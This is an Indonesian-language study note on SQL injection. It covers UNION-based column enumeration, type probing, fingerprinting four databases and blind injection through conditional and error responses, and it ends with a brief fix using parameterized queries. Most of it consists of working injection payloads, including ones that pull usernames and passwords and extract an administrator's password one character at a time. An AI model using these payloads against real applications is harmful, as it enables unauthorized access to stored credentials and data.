# SQL Injection
#teknik #sqli

## Basic

## UNION Attack
Dengan UNION, kamu dapat mengambil isi data dari tabel lain di dalam satu database.

`SELECT a, b FROM table1 UNION SELECT c,d FROM table2`
Perintah diatas menampilkan isi dari kolom a dan b pada table1 dan kolom c,d pada table2.

Supaya query UNION dapat bekerja, syaratnya adalah:
1. Tiap query harus menghasilkan jumlah kolom yang sama.
2. Tipe data pada tiap kolom harus kompatibel, contoh kolom integer dengan tipe data integer atau kolom integer dengan tipe data NULL (NULL dapat dikonversi ke semua tipe data).

**Untuk mengikuti syarat pertama**:
Saat melakukan UNION attack, kamu harus mengetahui secara persis jumlah kolom yang dihasilkan oleh query aslinya.

Cara yang pertama adalah dengan menggunakan `ORDER BY` sampai sebuah pesan error ditampilkan. 
`' ORDER BY 1 -- `, `' ORDER BY 2 -- `,  `' ORDER BY 3 -- ` 
Contoh pesan error: `The ORDER BY position number 3 is out of range of the number of items in the select list.` yang artinya jumlah kolom yang dihasilkan oleh query aslinya adalah 2 kolom.

Cara yang kedua adalah dengan memasukkan `UNION SELECT` dengan jumlah NULL yang bertambah sampai sebuah pesan error ditampilkan. Cara ini tidak selalu berhasil karena dapat menghasilkan error `NullPointerException`, namun dengan cara ini, terkadang kamu bisa mendapatkan data tambahan di dalam tabel.
`' UNION SELECT NULL -- `, `' UNION SELECT NULL, NULL -- `, `' UNION SELECT NULL, NULL, NULL -- `
Contoh pesan error: `All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.`

**Untuk mengikuti syarat kedua**
Kamu harus mengetahui apakah data yang akan kamu ambil kompatibel dengan kolom yang ada. Umumnya data yang bersifat rahasia disimpan dalam bentuk string, kamu bisa menggunakan `'a'` sebagai perwakilan dari string tersebut.
`' UNION SELECT 'a',NULL,NULL` memastikan bahwa kolom pertama memiliki tipe data string.
`' UNION SELECT NULL,'a',NULL` memastikan bahwa kolom kedua memiliki tipe data string.
`' UNION SELECT NULL,NULL,'a'` memastikan bahwa kolom ketiga memiliki tipe data string.
Contoh pesan error apabila tipe data tidak kompatibel dengan string data: `Conversion failed when converting the varchar value 'a' to data type int.`

Setelah kedua syarat tersebut dipenuhi, barulah action on objective dimulai. Contohnya kamu dapat mengambil username dan password dari database users. Anggap query menghasilkan 3 kolom.
`' UNION SELECT username,password,NULL FROM users -- `

Jika query aslinya hanya menghasilkan 1 kolom, kamu bisa menggunakan concatenation pada SQL Injection.
`' UNION SELECT username || '-' || password FROM users -- `

Hasilnya:
`administrator-admin123`

## SQL Injection pada Database Berbeda
### Microsoft
Dengan mencari tahu versi, kamu bisa tentukan jenis database apa yang digunakan, beserta syntax, dan kerentanannya.
`SELECT @@version`
Untuk mencari tahu versi, kamu bisa gunakan `UNION` attack jika sumber serangannya dari tabel lainnya.

Terdapat information schema yang memberikan informasi tentang database dan tabel.

**information_schema.tables**
`SELECT * FROM information_schema.tables`

Output:
```sql
TABLE_CATALOG TABLE_SCHEMA TABLE_NAME TABLE_TYPE  
=====================================================  
MyDatabase dbo Products BASE TABLE  
MyDatabase dbo Users BASE TABLE  
MyDatabase dbo Feedback BASE TABLE
```

**information_schema.columns**
`SELECT * FROM information_schema.columns WHERE table_name = 'Users'`

Output:
```sql
TABLE_CATALOG TABLE_SCHEMA TABLE_NAME COLUMN_NAME DATA_TYPE  
=================================================================  
MyDatabase dbo Users UserId int  
MyDatabase dbo Users Username varchar  
MyDatabase dbo Users Password varchar
```

### MySQL
Dengan mencari tahu versi, kamu bisa tentukan jenis database apa yang digunakan, beserta syntax, dan kerentanannya.
`SELECT @@version`
`SELECT version()`
Untuk mencari tahu versi, kamu bisa gunakan `UNION` attack jika sumber serangannya dari tabel lainnya.

Pada MySQL, setelah tanda komen `-- ` harus ada spasi. Atau kamu bisa menggunakan # sebagai gantinya.

Terdapat information schema yang memberikan informasi tentang database dan tabel.

**information_schema.tables**
`SELECT * FROM information_schema.tables`

Output:
```sql
TABLE_CATALOG TABLE_SCHEMA TABLE_NAME TABLE_TYPE  
=====================================================  
MyDatabase dbo Products BASE TABLE  
MyDatabase dbo Users BASE TABLE  
MyDatabase dbo Feedback BASE TABLE
```

**information_schema.columns**
`SELECT * FROM information_schema.columns WHERE table_name = 'Users'`

Output:
```sql
TABLE_CATALOG TABLE_SCHEMA TABLE_NAME COLUMN_NAME DATA_TYPE  
=================================================================  
MyDatabase dbo Users UserId int  
MyDatabase dbo Users Username varchar  
MyDatabase dbo Users Password varchar
```

### Oracle
Dengan mencari tahu versi, kamu bisa tentukan jenis database apa yang digunakan, beserta syntax, dan kerentanannya.
`SELECT * FROM v$version`
`SELECT BANNER FROM v$version`
Untuk mencari tahu versi, kamu bisa gunakan `UNION` attack jika sumber serangannya dari tabel lainnya.

Pada Oracle, setiap `SELECT` query harus diikuti `FROM`. Terdapat builtin tabel `DUAL` yang berisi 1 baris dan 1 kolom saja berisi kolom `DUMMY` dengan value `X`. Tabel `DUAL` ini dapat digunakan untuk melakukan `UNION` attack pada MySQL yang tidak memerlukan data dari tabel manapun.
`' UNION SELECT NULL,NULL FROM DUAL -- `

Pada Oracle, kamu bisa mendapatkan informasi mengenai seluruh database melalui view all_tables.
`SELECT * FROM ALL_TABLES`
`SELECT OWNER,TABLE_NAMES FROM ALL_TABLES`

Untuk informasi kolom bisa didapatkan melalui view all_tab_columns
`SELECT * FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='users'`


### PostgreSQL
Dengan mencari tahu versi, kamu bisa tentukan jenis database apa yang digunakan, beserta syntax, dan kerentanannya.
`SELECT version()`
Untuk mencari tahu versi, kamu bisa gunakan `UNION` attack jika sumber serangannya dari tabel lainnya.

Terdapat information schema yang memberikan informasi tentang database dan tabel.

**information_schema.tables**
`SELECT * FROM information_schema.tables`

Output:
```sql
TABLE_CATALOG TABLE_SCHEMA TABLE_NAME TABLE_TYPE  
=====================================================  
MyDatabase dbo Products BASE TABLE  
MyDatabase dbo Users BASE TABLE  
MyDatabase dbo Feedback BASE TABLE
```

**information_schema.columns**
`SELECT * FROM information_schema.columns WHERE table_name = 'Users'`

Output:
```sql
TABLE_CATALOG TABLE_SCHEMA TABLE_NAME COLUMN_NAME DATA_TYPE  
=================================================================  
MyDatabase dbo Users UserId int  
MyDatabase dbo Users Username varchar  
MyDatabase dbo Users Password varchar
```

## Blind SQL Injection
Ketika aplikasi rentan terhadap SQL injection, namun pada HTTP response, tidak mengandung informasi tentang SQL query ataupun error pada database. `UNION` attack tidak terlalu efektif untuk dilakukan pada blind SQL Injection, karena serangan ini bergantung kepada respon yang diberikan oleh server.

### Eksploitasi dengan Memicu Conditional Response
SQL Query:
`SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'`

Cobalah dengan membuat statement bernilai benar dan statement bernilai salah. Bandingkan karakteristik berbeda pada server.
`…xyz' AND '1'='1  
…xyz' AND '1'='2`

Ekstrak password administrator, hal ini dilakukan satu persatu.
`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm`

Substring, query ini akan menghasilkan foo
```SQL
SUBSTR('foobar', 1, 3) # Oracle
SUBSTRING('foobar', 1, 3) # Micrososft, PostgreSQL, MySQL
```

### Injeksi Conditional dan Memicu Error
Cek dengan injeksi, trigger error dengan percobaan 1 dibagi dengan 0.
```SQL
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a  
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

Tiap database, tekniknya berbeda
Oracle
```SQL
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual
```
Microsoft
```SQL
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END
```
PostgreSQL
```SQL
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END
```
MySQL
```SQL
SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')
```

Picu conditional response
```SQL
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```

Atau dengan concatenation
```SQL
xyz'||(SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```

## The Bug in The Code
Because it is directly concatenated to string query database
![](attachments/Pasted%20image%2020211028141808.png)

 Safe code, prevent user input to interfering with the query structure (Parameterized Query)
![](attachments/Pasted%20image%2020211028142534.png)


